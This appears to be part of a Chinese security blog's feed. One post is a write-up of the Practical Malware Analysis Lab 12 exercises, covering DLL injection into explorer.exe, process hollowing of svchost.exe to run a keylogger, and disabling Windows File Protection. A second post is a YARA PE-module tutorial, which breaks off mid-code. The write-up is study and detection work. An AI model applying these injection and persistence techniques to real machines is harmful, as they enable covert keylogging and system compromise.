    <published>2021-09-23T06:12:55.000Z</published>
    <updated>2021-09-24T09:16:58.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-12-1"><a href="#Lab-12-1" class="headerlink" title="Lab 12-1"></a>Lab 12-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开程序后，每隔一段时间都会弹出一个窗口</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-1.png"></p><p>使用火绒剑监控行为，发现其有注入的行为。可以看到注入的进程是Explorer.exe</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-2.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-3.png"></p><p>可以看出来它获取了explorer的PID然后进行了DLL注入，注入的DLL为Lab12-01.dll。它获得进程PID的方式是通过EnumProcesses、EnumProcessModules、GetModuleBaseNameA这三个函数实现的。首先通过EnumProcesses获得所有进程的PID，然后打开每个进程，再通过EnumProcessModules、GetModuleBaseNameA获取进程名字，再和explorer.exe进行比较判断。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-4.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-5.png"></p><p>现在来分析一下注入的DLL文件，DLLMAIN中创建了一个新的线程。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-6.png"></p><p>新的线程，会拼接一个字符串，也就是前面弹出窗口的标题的次数，会无限制的增长，那么创建的这个新线程应该就是弹窗函数了，进去看果然如此，最后调用sleep函数。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-7.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-8.png"></p><h3 id="1-在你运行恶意代码可执行文件时，会发生什么？"><a href="#1-在你运行恶意代码可执行文件时，会发生什么？" class="headerlink" title="1.在你运行恶意代码可执行文件时，会发生什么？"></a>1.在你运行恶意代码可执行文件时，会发生什么？</h3><p>会将Lab12-01.dll注入到explorer.exe中，然后每隔一分钟弹出一个窗口。</p><h3 id="2-哪个进程会被注入"><a href="#2-哪个进程会被注入" class="headerlink" title="2.哪个进程会被注入"></a>2.哪个进程会被注入</h3><p>explorer.exe</p><h3 id="3-你如何能够让恶意代码停止弹出窗口"><a href="#3-你如何能够让恶意代码停止弹出窗口" class="headerlink" title="3.你如何能够让恶意代码停止弹出窗口"></a>3.你如何能够让恶意代码停止弹出窗口</h3><p>重新启动explorer.exe</p><h3 id="4-这个恶意代码样本是如何工作的？"><a href="#4-这个恶意代码样本是如何工作的？" class="headerlink" title="4.这个恶意代码样本是如何工作的？"></a>4.这个恶意代码样本是如何工作的？</h3><p>它会进行远程线程注入将Lab12-01.dll注入到explorer.exe中，然后每分钟都会弹出一个窗口。</p><h2 id="Lab-12-2"><a href="#Lab-12-2" class="headerlink" title="Lab 12-2"></a>Lab 12-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>看到Main函数流程较短</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-1.png"></p><p>首先获得了svchost.exe的路径</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-2.png"></p><p>然后是从资源节读取了数据，然后有判断，如果开头不是MZ的话，会调用<code>401000</code>函数。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-3.png"></p><p>进入查看，可以看到是一个异或解密，那么这个资源节中的数据是异或0x41进行加密。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-4.png"></p><p>之后就是一个傀儡进程的创建，将shellcode注入到svchost.exe中</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-5.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-6.png"></p><p>把shellcodedump出来分析一下，发现是一个键盘记录的程序</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-7.png"></p><p>查看挂钩函数fn</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-8.png"></p><p>记录键盘输入内容</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-9.png"></p><h3 id="1-这个程序的目的是什么？"><a href="#1-这个程序的目的是什么？" class="headerlink" title="1.这个程序的目的是什么？"></a>1.这个程序的目的是什么？</h3><p>注入shellcode到svchost.exe，实现键盘钩子</p><h3 id="2-启动器恶意代码是如何隐蔽执行的？"><a href="#2-启动器恶意代码是如何隐蔽执行的？" class="headerlink" title="2.启动器恶意代码是如何隐蔽执行的？"></a>2.启动器恶意代码是如何隐蔽执行的？</h3><p>将shellcode注入到svchost.exe，实现了一个傀儡进程。</p><h3 id="3-恶意代码的负载存储在哪里？"><a href="#3-恶意代码的负载存储在哪里？" class="headerlink" title="3.恶意代码的负载存储在哪里？"></a>3.恶意代码的负载存储在哪里？</h3><p>存储在资源节之中</p><h3 id="4-恶意负载是如何被保护的？"><a href="#4-恶意负载是如何被保护的？" class="headerlink" title="4.恶意负载是如何被保护的？"></a>4.恶意负载是如何被保护的？</h3><p>与0x41异或加密了</p><h3 id="5-字符串列表是如何被保护的？"><a href="#5-字符串列表是如何被保护的？" class="headerlink" title="5.字符串列表是如何被保护的？"></a>5.字符串列表是如何被保护的？</h3><p>这个问题我没看懂，看了书上的答案，书上说是<code>401000</code>处函数，进行XOR编码。那个函数实际上就是解密shellcode的函数。所以它的意思应该是，shellcode中的字符串是如何被保护的。</p><h2 id="Lab-12-3"><a href="#Lab-12-3" class="headerlink" title="Lab 12-3"></a>Lab 12-3</h2><p>这就是Lab 12-2中的shellcode，刚才已经详细分析过了，就不再进行分析了。</p><h3 id="1-这个恶意负载的目的是什么？"><a href="#1-这个恶意负载的目的是什么？" class="headerlink" title="1.这个恶意负载的目的是什么？"></a>1.这个恶意负载的目的是什么？</h3><p>键盘记录</p><h3 id="2-恶意负载是如何注入自身的？"><a href="#2-恶意负载是如何注入自身的？" class="headerlink" title="2.恶意负载是如何注入自身的？"></a>2.恶意负载是如何注入自身的？</h3><p>这个我也没看懂，没明白什么叫注入自身，因为没看到注入行为，看了书上的答案，意思是</p><blockquote><p>挂钩注入，来偷取击键记录</p></blockquote><p>原来是这样，好吧…</p><h3 id="3-这个恶意程序还创建了哪些其他文件？"><a href="#3-这个恶意程序还创建了哪些其他文件？" class="headerlink" title="3.这个恶意程序还创建了哪些其他文件？"></a>3.这个恶意程序还创建了哪些其他文件？</h3><p>创建了practicalmalwareanalysis.log文件，来记录。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/3-1.png"></p><h2 id="Lab-12-4"><a href="#Lab-12-4" class="headerlink" title="Lab 12-4"></a>Lab 12-4</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开发现其前部分与Lab12-1是一致的，就不再进行分析饿了，只是在<code>401000</code>中是winlogon.exe，也就是前面这部分是获取winlogon.exe的PID</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-1.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-2.png"></p><p>现在来分析一下后面的部分</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-3.png"></p><p>首先是进行了提权，判断是否有SeDebugPrivilege权限，如果没有的话会进行提权。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-4.png"></p><p>然后会进行远程线程注入，注入函数是sfc_os.dll中的序号为2的函数，</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-5.png"></p><p>然后会移动文件</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-6.png"></p><p>最后是一个资源释放，释放到C:\Windows\system32\wupdmgr.exe，并且隐藏窗口启动它。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-7.png"></p><p>把资源节中的程序dump下来分析，首先看到启动了winup.exe也就是原始的wupdmgr.exe，然后会访问<a href="http://www.practicalmalwareanalysis.com/updater.exe">http://www.practicalmalwareanalysis.com/updater.exe</a> ，进行下载更新恶意代码。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-8.png"></p><h3 id="1-位置0x401000的代码完成了什么功能"><a href="#1-位置0x401000的代码完成了什么功能" class="headerlink" title="1.位置0x401000的代码完成了什么功能"></a>1.位置0x401000的代码完成了什么功能</h3><p>判断当前进程的PID是否是winlogon.exe</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-2.png"></p><h3 id="2-代码注入了哪些进程？"><a href="#2-代码注入了哪些进程？" class="headerlink" title="2.代码注入了哪些进程？"></a>2.代码注入了哪些进程？</h3><p>winlogon.exe</p><h3 id="3-使用LoadLibraryA装载了哪个DLL程序？"><a href="#3-使用LoadLibraryA装载了哪个DLL程序？" class="headerlink" title="3.使用LoadLibraryA装载了哪个DLL程序？"></a>3.使用LoadLibraryA装载了哪个DLL程序？</h3><p>sfc_os.dll</p><h3 id="4-传递给CreateRemoteThread调用的第四个参数是什么？"><a href="#4-传递给CreateRemoteThread调用的第四个参数是什么？" class="headerlink" title="4.传递给CreateRemoteThread调用的第四个参数是什么？"></a>4.传递给CreateRemoteThread调用的第四个参数是什么？</h3><p>sfc_os.dll中的序号为2的函数，是一个名为SfcTerminateWatcherThread的函数，用来关闭windows的文件保护。</p><h3 id="5-二进制主程序释放出了哪个恶意代码？"><a href="#5-二进制主程序释放出了哪个恶意代码？" class="headerlink" title="5.二进制主程序释放出了哪个恶意代码？"></a>5.二进制主程序释放出了哪个恶意代码？</h3><p>wupdmgr.exe，原始的wupdmgr.exe被放到了temp目录下，重命名为了winup.exe</p><h3 id="6-释放出恶意代码的目的是什么？"><a href="#6-释放出恶意代码的目的是什么？" class="headerlink" title="6.释放出恶意代码的目的是什么？"></a>6.释放出恶意代码的目的是什么？</h3><p>会从指定的域名中下载一些资源，来进行更新，而windows本身的wupdmgr.exe被转移到temp目录下，在持久化驻留的同时，也不影响原程序的运行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-12-1&quot;&gt;&lt;a href=&quot;#Lab-12-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 12-1&quot;&gt;&lt;/a&gt;Lab 12-1&lt;/h2&gt;&lt;h3 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>yara规则学习笔记（三）</title>
    <link href="https://b1ackie.cn/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://b1ackie.cn/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2021-09-22T07:31:15.000Z</published>
    <updated>2021-09-26T10:14:05.070Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本的一些语法，规则的应用基本已经学习完了，现在来练习一下模块的用法，主要先是PE这个模块，具体的每一个值的用法在官方文档中已经描述的非常详细了，我就不再过多的去介绍其用法了，我只是拿过来部分去进行实际的编写测试。在本篇之前，应该至少要对PE文件结构有了解，如果对PE还不是非常的了解的话，建议先去学习PE结构。</p><p>官方文档PE模块地址：</p><p><a href="https://yara.readthedocs.io/en/v4.1.2/modules/pe.html">https://yara.readthedocs.io/en/v4.1.2/modules/pe.html</a></p><p>之前的学习笔记</p><p><a href="https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">yara规则学习笔记（一）</a></p><p><a href="https://b1ackie.cn/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/">yara规则学习笔记（二）</a></p><h2 id="PE模块"><a href="#PE模块" class="headerlink" title="PE模块"></a>PE模块</h2><p>导入PE模块非常简单，加入</p><blockquote><p>import “pe”</p></blockquote><p>这样即可导入。</p><p>该模块中公布了PE结构中大部分存在的字段，并提供了可用于编写更加具有针对性的功能。</p><p>官方示例</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">single_section</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.number_of_sections == <span class="hljs-number">1</span><br>&#125;<br><br>rule <span class="hljs-class">control_panel_applet</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.exports(<span class="hljs-string">&quot;CPlApplet&quot;</span>)<br>&#125;<br><br>rule <span class="hljs-class">is_dll</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.characteristics &amp; pe.DLL<br>&#125;<br><br>rule <span class="hljs-class">is_pe</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.is_pe<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先先编写一个弹窗的exe来进行测试，不进行任何的优化设置。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;yara rule test&quot;</span>, <span class="hljs-string">&quot;b1ackie!&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="machine"><a href="#machine" class="headerlink" title="machine"></a>machine</h3><p>machine字段是运行平台，可以在编写时指定对应的值来判断运行平台，具体的值请去官方文档进行查看。</p><p>查看编写的测试文件的machine，可以看到是Intel386。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/1.png"></p><p>编写相应的规则</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">machine</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.machine == pe.MACHINE_I386<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/2.png"></p><h3 id="timestamp"><a href="#timestamp" class="headerlink" title="timestamp"></a>timestamp</h3><p>时间戳</p><p>在前面可以看到时间戳是6150116D</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">time</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.timestamp == <span class="hljs-number">0x6150116D</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="size-of-optional-header"><a href="#size-of-optional-header" class="headerlink" title="size_of_optional_header"></a>size_of_optional_header</h3><p>可选头的大小</p><p>从前面的图片可以看到，可选头的大小是0xE0，编写规则。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">size_of_optional_header</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.size_of_optional_header == <span class="hljs-number">0xE0</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="size-of-code"><a href="#size-of-code" class="headerlink" title="size_of_code"></a>size_of_code</h3><p>这是IMAGE_OPTIONAL_HEADER::SizeOfCode的值</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/3.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">size_of_code</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.size_of_code == <span class="hljs-number">0xE00</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="entry-point"><a href="#entry-point" class="headerlink" title="entry_point"></a>entry_point</h3><p>入口点</p><p>使用OD打开测试程序，可以看到入口点处的代码十六进制值</p><blockquote><p>E8 C5 03 00 00</p></blockquote><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/4.png"></p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;E8 C5 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span> at pe.entry_point<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="entry-point-raw"><a href="#entry-point-raw" class="headerlink" title="entry_point_raw"></a>entry_point_raw</h3><p>入口点的地址</p><p>查看入口点地址</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/5.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.entry_point_raw == <span class="hljs-number">0x126C</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="base-of-code"><a href="#base-of-code" class="headerlink" title="base_of_code"></a>base_of_code</h3><p>IMAGE_OPTIONAL_HEADER::BaseOfCode 的值</p><h3 id="base-of-data"><a href="#base-of-data" class="headerlink" title="base_of_data"></a>base_of_data</h3><p>IMAGE_OPTIONAL_HEADER::BaseOfData 的值</p><h3 id="image-base"><a href="#image-base" class="headerlink" title="image_base"></a>image_base</h3><p>IMAGE_OPTIONAL_HEADER::ImageBase 的值</p><p>现在来一起测试一下，查看示例程序这三项的值</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/6.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.<span class="hljs-keyword">base_of_code </span>== <span class="hljs-number">0x1000</span> <span class="hljs-keyword">and </span><br>pe.<span class="hljs-keyword">base_of_data </span>== <span class="hljs-number">0x2000</span> <span class="hljs-keyword">and</span><br><span class="hljs-keyword"></span>pe.image_base == <span class="hljs-number">0x400000</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="data-directories"><a href="#data-directories" class="headerlink" title="data.directories"></a>data.directories</h3><p>数据目录表中的IMAGE_DATA_DIRECTORY结构信息，RVA和SIZE。具体的字段参考官方文档。</p><p>这里用导入表（IMAGE_DIRECTORY_ENTRY_IMPORT）来做测试，查看示例程序的导入表的RVA和size</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/7.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.data_directories</span><br><span class="hljs-selector-attr">[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]</span><span class="hljs-selector-class">.virtual_address</span><br>== <span class="hljs-number">0</span>x2594 <br>and<br>pe<span class="hljs-selector-class">.data_directories</span><br><span class="hljs-selector-attr">[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]</span><span class="hljs-selector-class">.size</span><br>== <span class="hljs-number">0</span>xb4<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="number-of-sections"><a href="#number-of-sections" class="headerlink" title="number_of_sections"></a>number_of_sections</h3><p>pe文件中的节的数量</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/8.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.number_of_sections == <span class="hljs-number">5</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="sections"><a href="#sections" class="headerlink" title="sections"></a>sections</h3><p>PE文件中的节的信息，PE 的每个部分对应一个。可以使用 [] 运算符访问各个部分。具体的信息可以去官方文档进行查看。这里介绍部分。</p><p><code>name</code>，名称</p><p><code>virtual_address</code>，虚拟地址</p><p><code>virtual_size</code>，虚拟大小</p><p><code>raw_data_offset</code>，raw地址</p><p><code>raw_data_size</code>，raw大小</p><p>查看示例程序这几项的数据</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/9.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 